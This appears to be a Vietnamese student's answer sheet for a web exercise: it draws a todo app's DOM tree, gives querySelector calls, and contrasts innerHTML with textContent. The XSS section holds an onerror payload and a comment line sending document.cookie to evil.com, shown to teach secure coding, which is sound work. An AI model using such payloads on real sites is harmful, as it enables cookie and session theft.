PHẦN A - KIỂM TRA PHẦN ĐỌC HIỂU
Câu A1 - DOM Tree
- Sơ đồ cây DOM
document
└── div#app
    ├── header
    │   ├── h1 ("Todo App")
    │   └── nav
    │       ├── a.active ("All")
    │       ├── a ("Active")
    │       └── a ("Completed")
    └── main
        ├── form#todoForm
        │   ├── input#todoInput [type="text"]
        │   └── button ("Add")
        └── ul#todoList
            ├── li.todo-item ("Learn HTML")
            └── li.todo-item.completed ("Learn CSS")

- querySelector cho từng yêu cầu:
// 1. Chọn thẻ <h1>
document.querySelector("h1")
// hoặc: document.querySelector("#app header h1")

// 2. Chọn input trong form
document.querySelector("#todoForm input")
// hoặc: document.querySelector("#todoInput")

// 3. Chọn tất cả .todo-item
document.querySelectorAll(".todo-item")

// 4. Chọn link đang active
document.querySelector("a.active")
// hoặc: document.querySelector("nav .active")

// 5. Chọn <li> đầu tiên trong #todoList
document.querySelector("#todoList li")
// hoặc: document.querySelector("#todoList li:first-child")

// 6. Chọn tất cả <a> bên trong <nav>
document.querySelectorAll("nav a")

Câu A2 - innerHTML vs textContent
            innerHTML                                textContent
Đọc         Trả về HTML bao gồm cả tags              Chỉ trả về text thuần, bỏ tags
Ghi         Parse chuỗi thành HTML nodes             Chèn đúng nghĩa là text, không parse
Tốc độ      Chậm hơn (phải parse HTML)               Nhanh hơn
Bảo mật     ⚠️ Nguy hiểm nếu dùng với user input    ✅ An toàn

- Khi nào dùng innerHTML: Khi cần chèn HTML có cấu trúc phức tạp từ nguồn đáng tin cậy (template tĩnh, không phải user input). Ví dụ: container.innerHTML = "<ul><li>Item 1</li></ul>".
- Khi nào dùng textContent: Khi chèn text từ user input, dữ liệu bên ngoài, hoặc bất kỳ nguồn không đáng tin cậy nào.

- Lỗ hổng XSS với innerHTML
// NGUY HIỂM: User nhập <img src=x onerror="alert('Hacked!')">
const userInput = document.querySelector("#search").value;
document.querySelector("#result").innerHTML = userInput;
// → Trình duyệt parse HTML → thực thi onerror → alert chạy!
// Thực tế hacker có thể đánh cắp cookie: onerror="fetch('evil.com?c='+document.cookie)"

// CÁCH SỬA 1: Dùng textContent thay innerHTML
document.querySelector("#result").textContent = userInput;
// → userInput được hiển thị như text thuần, tags bị hiện nguyên ký tự

// CÁCH SỬA 2: Tạo text node
const textNode = document.createTextNode(userInput);
document.querySelector("#result").appendChild(textNode);

